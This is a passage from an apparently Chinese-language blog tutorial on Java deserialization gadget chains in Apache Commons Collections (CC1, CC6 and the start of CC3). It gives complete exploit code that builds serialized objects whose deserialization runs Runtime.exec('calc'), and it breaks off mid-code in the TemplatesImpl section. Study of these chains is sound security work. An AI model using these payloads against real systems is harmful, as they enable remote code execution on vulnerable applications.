+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span>  Runtime.class;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>chainedTransformer.transform(r);<br></code></pre></td></tr></table></figure>
+
+<p>那么现在就剩下两个问题了</p>
+<p>我们跟进去看如何去保证两个If语句都进入呢</p>
+<p>​<img src="/assets/image-20231208170746-r6mxyt8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>首先第一个if是比较容易过的，因为他要去找<code>AnnotationInvocationHandler</code>​传进来的注解的成员变量，要存在并且map的key可以找到他的成员变量即可，所以做出以下修改</p>
+<p>​<img src="/assets/image-20231208170952-53c8u9w.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>第二个if就直接过就行了，所以最后的问题就是这一句话</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>那是不是这个传入的东西不可控了呢?</p>
+<p>‍</p>
+<p>这里作者再次找到了一个实现类<code>ConstantTransformer</code>​</p>
+<p>他的<code>transform</code>​方法就是一句话 传入什么都返回常量，那我无所谓value的值，只需要在</p>
+<p>​<img src="/assets/image-20231208171435-tk6o2js.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那如果返回的常量是<code>Runtime.class</code>​就可以进行传入了</p>
+<p>‍</p>
+<p>整条链子就结束了 exp如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="hljs-literal">null</span>,chainedTransformer);<br>  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Target.class,transformedMap);<br>  <br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>我们来回顾一下这条链子，从正向调过去</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">反序列化#readObject-&gt;<br>	AnnotationInvocationHandler#readObject(存在setValue)<br>		MapEntry#setValue(存在checkSetValue)<br>			transformedMap#checkSetValue(存在transform)<br>				InvokerTransformer.transform(就可以调用任意方法执行任意操作)<br></code></pre></td></tr></table></figure>
+
+<pre><code class="hljs">                                                    ![image](assets/image-20231211134204-itc5k18.png)​
+</code></pre>
+<p>‍</p>
+<p>‍</p>
+<h2 id="​LazyMap​​"><a href="#​LazyMap​​" class="headerlink" title="​LazyMap​​"></a>​<code>LazyMap</code>​​</h2><p>‍</p>
+<p>在调用<code>transform</code>​ 方法中，<code>LazyMap#get()</code>​也调用了</p>
+<p>​<img src="/assets/image-20231209102159-9vmbrm6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>但这里存在个条件</p>
+<ol>
+<li>key要为空</li>
+</ol>
+<p>然后就会调用<code>factory</code>​的<code>transform</code>​，那<code>factory</code>​咋来的呢？</p>
+<p>可以看看他的静态方法和构造器</p>
+<p>​<img src="/assets/image-20231209102655-5l314a7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231209102706-z3g97f1.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>可以明显看出 就是构造的时候传进去<code>Transformer</code>​类即可</p>
+<p>所以可以构造如下代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br></code></pre></td></tr></table></figure>
+
+<p>那么往上找一下谁调用了<code>get()</code>​方法并且可以传值为Object</p>
+<p>‍</p>
+<p>于是作者找到了<code>AnnotationInvocationHandler#invoke</code>​方法调用了<code>get</code>​方法</p>
+<p>​<img src="/assets/image-20231209103340-6mcuk32.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>又因为这个是<code>invoke</code>​方法，所以可以想到如果传入的是一个动态代理，并且调用的这个处理器类就可以默认去执行他的<code>invoke</code>​方法，所以其实也很清晰，就是通过传入一个代理类然后去调用一个方法即可触发这个代理调用处理器的<code>invoke</code>​方法，那么这里的<code>invoke</code>​是有几个条件的</p>
+<ol>
+<li>不能调用<code>equals</code>​</li>
+<li>无参方法</li>
+</ol>
+<p>结果<code>readObject()</code>​中真的就存在一个不受限制的无参方法<code>entrySet</code>​</p>
+<p>‍</p>
+<p>​<img src="/assets/image-20231209104208-xuwtkzz.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>所以这里就可以写exp了，将我们代理类以Map类传入，就可以走通了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>  <br>HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>cls.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br>  <br>serialize(o);<br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231209105315-awq4i67.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>这里来解释一下为什么代理Map和实例化两个 因为我们可以看到两个<code>membervalue</code>​</p>
+<p>第一个实例化对象是把Map给到readObject的<code>Map.Entry</code>​来调用<code>entrySet</code>​，第二个实例化对象是通过调用<code>entrySet</code>​来触发动态代理的<code>invoke</code>​方法</p>
+<p>​<img src="/assets/image-20231209105556-hjetfba.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>他是不受JDK版本的限制的</p>
+<p>‍</p>
+<p>CC6其实就是CC1的<code>LazyMap</code>​后半段+前半段是<code>HashMap</code>​</p>
+<p>‍</p>
+<p>链子也很简单 作者从HashMap中发现了如下东西</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap#readObject<br>	TiedMapEntry#hashcode<br>		LazyMap#get<br>			InvokerTransformer.transform(就可以调用任意方法执行任意操作)<br></code></pre></td></tr></table></figure>
+
+<p>先看<code>TiedMapEntry</code>​的构造方法比较简单直接传map跟key即可</p>
+<p>​<img src="/assets/image-20231209111758-8saxpzv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>所以简单就可以构造出来，这里先放序列化就可以调用calc的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>           <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>   <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>   HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br><br>   <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br>   HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>   map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>   serialize(map2);<br></code></pre></td></tr></table></figure>
+
+<p>为啥呢，从URLDNS链也可以知道 ，<code>HashMap#put()</code>​方法也是可以触发<code>hashcode</code>​的，所以我们还需要用反射的方式去修改点属性让他反序列化出来也没问题</p>
+<p>所以可以先让他put进去的时候是空的，然后put完去序列化的时候通过反射再给他赋值</p>
+<p>​<img src="/assets/image-20231209121732-mlo56ku.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>但是这里反序列化还是不会执行，为什么呢？通过调试我们发现他在<code>LazyMap#get()</code>​方法的时候最后会把key return回去</p>
+<p>​<img src="/assets/image-20231209122117-blrtzt9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>那也就是说在put方法之后我们去把这个key给<code>remote</code>​掉就好了</p>
+<p>最终exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125; ;<br><br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>       HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><br><br>       <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;aa&quot;</span>);<br>       HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>       lazyMap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br><br>       <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> LazyMap.class;<br>       <span class="hljs-type">Field</span> <span class="hljs-variable">factoryfield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>       factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>       factoryfield.set(lazyMap,chainedTransformer);<br><br>       serialize(map2);<br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>​<img src="/assets/image-20231209113104-zjachdp.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>‍</p>
+<p>CC3其实后半段就是动态类加载，其实就是跟<code>Fastjson</code>​的&lt;&#x3D;1.2.24的Jdk7u21链子是一样的，(因为我先学了fastjson)</p>
+<h2 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h2><p>‍</p>
+<h3 id="​TemplatesImpl-TransletClassLoader-defineClass-​​"><a href="#​TemplatesImpl-TransletClassLoader-defineClass-​​" class="headerlink" title="​TemplatesImpl.TransletClassLoader#defineClass()​​"></a>​<code>TemplatesImpl.TransletClassLoader#defineClass()</code>​​</h3><p>因为要找<code>defineclass</code>​重写过的方法，所以这条链子的作者在<code>rt.jar</code>​中找到了defineClass <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader.defineClass()</code>​</p>
+<p>​<img src="/assets/image-20231210103207-b4hkwjf.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="​TemplatesImpl-defineTransletClasses-​​"><a href="#​TemplatesImpl-defineTransletClasses-​​" class="headerlink" title="​TemplatesImpl#defineTransletClasses()​​"></a>​<code>TemplatesImpl#defineTransletClasses()</code>​​</h3><p>但是在实际场景中，因为defineClass方法作用域却是不开放的(就是并不是public方法，所以需要找谁去调用了他)，所以我们很很难直接利用到它所以我们要去找谁调用了这个<code>defineClass</code>​函数 ，于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses()</code>​</p>
+<p>​<img src="/assets/image-20231210103503-wemf4nc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<h3 id="​TemplatesImpl-getTransletInstance-​​"><a href="#​TemplatesImpl-getTransletInstance-​​" class="headerlink" title="​TemplatesImpl#getTransletInstance()​​"></a>​<code>TemplatesImpl#getTransletInstance()</code>​​</h3><p>再往上找看哪里是<code>public</code>​属性的方法调用了他，并且在上述方法中是对字节码进行了加载，并没有初始化，所以要找到链子的某个地方进行了初始化并且最终的入口方法是public方法，最后作者在这里找到了</p>
+<p>​<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance()</code>​</p>
+<p>​<img src="/assets/image-20231210103641-igrjbte.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>​<img src="/assets/image-20231130132654-oavldte.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>可以看到在加载了<code>_class</code>​属性后进行了<code>.newInstance()</code>​初始化，完全符合我们的要求</p>
+<p>但是他仍然是私有方法</p>
+<h3 id="​TemplatesImpl-newTransformer-​​"><a href="#​TemplatesImpl-newTransformer-​​" class="headerlink" title="​TemplatesImpl#newTransformer()​​"></a>​<code>TemplatesImpl#newTransformer()</code>​​</h3><p>所以继续往上找于是找到了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code>​</p>
+<p>​<img src="/assets/image-20231130105452-10cll7u.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<p>所以我们先来写一个demo(因为<code>_tfactory</code>​在反序列化的时候会自动实例化赋值，但是直接调用并不会所以这里写demo的时候需要自行加上才能执行成功)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>     <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>     bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>     <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Java_project\\Serialization_Learing\\target\\classes\\Test.class&quot;</span>));<br>     <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>     bytecodesField.set(templates, codes);<br>     <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>     nameField.setAccessible(<span class="hljs-literal">true</span>);<br>     nameField.set(templates, <span 